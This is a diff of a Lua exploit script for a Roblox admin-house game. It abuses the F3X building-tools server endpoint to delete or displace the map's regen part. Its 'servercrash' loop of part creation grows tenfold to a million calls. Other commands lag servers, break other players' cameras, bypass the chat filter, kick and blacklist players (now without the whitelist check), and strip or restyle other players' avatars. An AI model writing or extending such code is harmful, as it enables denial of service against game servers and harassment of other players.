@@ -19,13 +19,13 @@ if game.PlaceId ~= 14747334292 then
                 local TS = game:GetService("TeleportService")
                 local HS = game:GetService("HttpService")
                 pcall(function()
-                    local servers = HS:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?limit=100"))
+                    local servers = HS:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/14747334292/servers/Public?limit=100"))
                     local good = {}
                     for _, s in ipairs(servers.data) do
                         if s.playing < s.maxPlayers then table.insert(good, s) end
                     end
                     if #good > 0 then
-                        TS:TeleportToPlaceInstance(game.PlaceId, good[math.random(1, #good)].id, game.Players.LocalPlayer)
+                        TS:TeleportToPlaceInstance(14747334292, good[math.random(1, #good)].id, game.Players.LocalPlayer)
                     end
                 end)
             end
@@ -217,19 +217,17 @@ local function permLoop()
     if permCoroutine then task.cancel(permCoroutine) end
     permCoroutine = task.spawn(function()
         while permEnabled do
-            pcall(function()
-                if not hasRealAdmin() then
-                    local free = getFreePad()
-                    if free then
-                        claimPad(free)
-                    else
-                        if Admin and Admin:FindFirstChild("Regen") and Admin.Regen:FindFirstChild("ClickDetector") then
-                            fireclickdetector(Admin.Regen.ClickDetector)
-                            task.wait(0.3)
-                        end
+            if not hasRealAdmin() then
+                local free = getFreePad()
+                if free then
+                    claimPad(free)
+                else
+                    if Admin and Admin:FindFirstChild("Regen") and Admin.Regen:FindFirstChild("ClickDetector") then
+                        fireclickdetector(Admin.Regen.ClickDetector)
+                        task.wait(0.3)
                     end
                 end
-            end)
+            end
             task.wait(0.1)
         end
     end)
@@ -267,7 +265,7 @@ plr.CharacterAdded:Connect(function(chr)
             while autoGod or autoForceField do
                 if autoGod then
                     local hum = chr:FindFirstChild("Humanoid")
-                    if hum and hum.MaxHealth ~= math.huge then
+                    if hum and hum.Health < 1000 then -- change condition to avoid spam
                         tchat("god me")
                     end
                 end
@@ -488,7 +486,6 @@ addcommand("bl", "Add player to blacklist & kick if online", function(args)
         if reason:match("^%s*$") then reason = nil end
     end
     for _, tgt in pairs(GetPlayers(target)) do
-        if tgt.Name == ownerName or isWhitelisted(tgt) then continue end
         if not table.find(blacklisted, tgt.Name) then
             local line = reason and (tgt.Name .. "|" .. reason) or tgt.Name
             appendfile("Blacklisted.txt", line .. "\n")
@@ -639,40 +636,57 @@ addcommand("regen", "Click regen button", function()
     if regen and regen:FindFirstChild("ClickDetector") then fireclickdetector(regen.ClickDetector) WindUI:Notify({Title="†Køhlsîfy", Content="Regen clicked", Duration=2}) end
 end)
 
-addcommand("rmoveregen", "Remove regen by moving to workspace and deleting", function()
-    if not plr.Backpack:FindFirstChild("Building Tools") then
-        tchat("f3x")
-        task.wait(2)
-    end
-    if not plr.Backpack:FindFirstChild("Building Tools") then
-        WindUI:Notify({Title="†Køhlsîfy", Content="You no have F3X", Duration=3})
-        return
-    end
+-- New fixregen: move Regen to workspace, delete it so server respawns
+addcommand("fixregen", "Move regen to workspace and delete it", function()
+    tchat("f3x")
+    task.wait(2)
     local regen = Admin and Admin:FindFirstChild("Regen")
-    if not regen then return end
+    if not regen then WindUI:Notify({Title="†Køhlsîfy", Content="Regen not found", Duration=2}) return end
     regen.Parent = workspace
-    task.wait(0.1)
-    local api = workspace.nowhudhejeir["Building Tools"].SyncAPI.ServerEndpoint
-    pcall(function() api:InvokeServer(table.unpack({[1]="Remove", [2]={regen}})) end)
-    WindUI:Notify({Title="†Køhlsîfy", Content="Regen removed", Duration=2})
+    task.wait(0.5)
+    if plr.Backpack:FindFirstChild("Building Tools") then
+        local api = workspace.nowhudhejeir["Building Tools"].SyncAPI.ServerEndpoint
+        pcall(function() api:InvokeServer(table.unpack({[1]="Remove", [2]={regen}})) end)
+    end
+    WindUI:Notify({Title="†Køhlsîfy", Content="Regen reset", Duration=2})
 end)
 
-addcommand("fixregen", "Fix regen by deleting it so server restores default", function()
-    if not plr.Backpack:FindFirstChild("Building Tools") then
-        tchat("f3x")
-        task.wait(2)
+addcommand("tptoregen", "Teleport to regen", function()
+    local regen = Admin and Admin:FindFirstChild("Regen") or workspace:FindFirstChild("Regen")
+    if regen and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then plr.Character.HumanoidRootPart.CFrame = regen.CFrame * CFrame.new(0, 2.5, 0) end
+end)
+
+-- New rmoveregen: move Regen to nil using SyncMove
+local function GetNil(Name, DebugId)
+    for _, Object in getnilinstances() do
+        if Object.Name == Name and Object:GetDebugId() == DebugId then
+            return Object
+        end
     end
-    if not plr.Backpack:FindFirstChild("Building Tools") then
-        WindUI:Notify({Title="†Køhlsîfy", Content="You no have F3X", Duration=3})
-        return
-    end
+end
+
+addcommand("rmoveregen", "Remove regen (move to nil)", function()
+    tchat("f3x")
+    task.wait(2)
     local regen = Admin and Admin:FindFirstChild("Regen")
-    if not regen then return end
+    if not regen then WindUI:Notify({Title="†Køhlsîfy", Content="Regen not found", Duration=2}) return end
     regen.Parent = workspace
-    task.wait(0.1)
-    local api = workspace.nowhudhejeir["Building Tools"].SyncAPI.ServerEndpoint
-    pcall(function() api:InvokeServer(table.unpack({[1]="Remove", [2]={workspace.Regen}})) end)
-    WindUI:Notify({Title="†Køhlsîfy", Content="Regen fixed (will restore)", Duration=2})
+    task.wait(0.5)
+    local event = GetNil("ServerEndpoint", "1_678455")
+    if event then
+        pcall(function()
+            event:InvokeServer(
+                "SyncMove",
+                {
+                    {
+                        Part = regen,
+                        CFrame = CFrame.new(-93848838485, -999999999, -98313868284, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+                    }
+                }
+            )
+        end)
+    end
+    WindUI:Notify({Title="†Køhlsîfy", Content="Regen moved to nil", Duration=2})
 end)
 
 addcommand("deletetool", "Get delete tool", function()
@@ -943,7 +957,7 @@ addcommand("slag", "Server lag (2 stones)", function()
 end)
 addcommand("serverlag", "", function(args) commands["slag"](args) end)
 
-addcommand("servercrash", "Crash the server with many blocks", function()
+addcommand("servercrash", "Crash server with many blocks", function()
     if not plr.Backpack:FindFirstChild("Building Tools") then
         tchat("f3x")
         task.wait(2)
@@ -955,11 +969,11 @@ addcommand("servercrash", "Crash the server with many blocks", function()
     local api = workspace.nowhudhejeir["Building Tools"].SyncAPI.ServerEndpoint
     local pos = plr.Character and plr.Character.HumanoidRootPart and plr.Character.HumanoidRootPart.CFrame or CFrame.new(0, 5, 0)
     spawn(function()
-        for i = 1, 100000 do
+        for i = 1, 1000000 do
             pcall(function()
                 api:InvokeServer("CreatePart", "Normal", pos, workspace.Tabby.Admin_House)
             end)
-            if i % 500 == 0 then task.wait() end
+            if i % 1000 == 0 then task.wait() end
         end
     end)
     WindUI:Notify({Title="†Køhlsîfy", Content="Server crash initiated!", Duration=3})
@@ -1064,15 +1078,16 @@ addcommand("femify", "Make player feminine", function(args)
     tchat("pants " .. tgt.Name .. " 7219538593")
 end)
 
--- UI: Commands tab with two paragraphs
+-- UI: split commands into two paragraphs
 local __commandsTab = Window:Tab({ Title = "Commands", Icon = "lucide:terminal" })
 __commandsTab:Paragraph({
     Title = "Commands 1",
-    Desc = "ban <player> [reason] - blacklist & kick\nunban <player> - unblacklist\nfpunish <player> - fake punish\nkick <player> [reason] - hot potato kick\nkid <player> - make kid\nspam <msg> - spam\nunspam - stop spam\nfixfilter - fix filter\nbypassmessage <msg> - bypass filter (system)\ncage <player> - cage\nloopcage <player> - loop cage\nunloopcage <player> - stop loop\ngearbl/gearban/gearblacklist <player> - gear ban\nungearbl <player> - ungear ban\nnok - remove all TouchInterests\nclrall/clr - delete all workspace parts\nfix - remove problematic seats and spawns\nunlockworkspace/unlockws - unlock all parts\nnocam - break camera\nfcam <player> - break player's camera\nfixcam - fix camera\nslag/serverlag - lag server\nservercrash/crash/shutdown - crash server\nr15/r6 - switch rig\nping - show ping\njerk - animation\nrejoin/rj - rejoin\nserverhop/shop - hop server\nequipall - equip all\ndropall - drop all"
+    Desc = "ban <player> [reason] - blacklist & kick\nunban <player> - unblacklist\nfpunish <player> - fake punish\nkick <player> [reason] - hot potato kick\nkid <player> - make kid\nspam <msg> - spam\nunspam - stop spam\nfixfilter - fix filter\nbypassmessage <msg> - bypass filter (system)\ncage <player> - cage\nloopcage <player> - loop cage\nunloopcage <player> - stop loop\ngearbl/gearban/gearblacklist <player> - gear ban\nungearbl <player> - ungear ban\nnok - remove all TouchInterests\nclrall/clr - delete all workspace parts\nfix - remove problematic seats and spawns\nunlockworkspace/unlockws - unlock all parts\nnocam - break camera\nfcam <player> - break player's camera\nfixcam - fix camera\nslag/serverlag - lag server\nservercrash/crash/shutdown - crash server"
 })
+
 __commandsTab:Paragraph({
     Title = "Commands 2",
-    Desc = "furry <player> - make furry\nnaked/nude/nakify <player> - paint skin color\nfemify <player> - make feminine\nhide/show - toggle command sending to chat"
+    Desc = "fixvel - fix velocity of map parts\nregen - click regen button\nfixregen - move regen to spawn\ntptoregen - teleport to regen\nrmoveregen - remove regen\ndeletetool - get delete tool\nr15/r6 - switch rig\nping - show ping\njerk - animation\nrejoin/rj - rejoin\nserverhop/shop - hop server\nequipall - equip all\ndropall - drop all\nfurry <player> - make furry\nnaked/nude/nakify <player> - paint skin color\nfemify <player> - make feminine\nhide/show - toggle command sending to chat"
 })
 
 local __toolsTab = Window:Tab({ Title = "Tools", Icon = "tool" })
@@ -1195,7 +1210,7 @@ for _, p in ipairs(Players:GetPlayers()) do
         end
         handleBannedPlayer(p)
     end
-end)
+end
 
 if permEnabled then permLoop() end
 
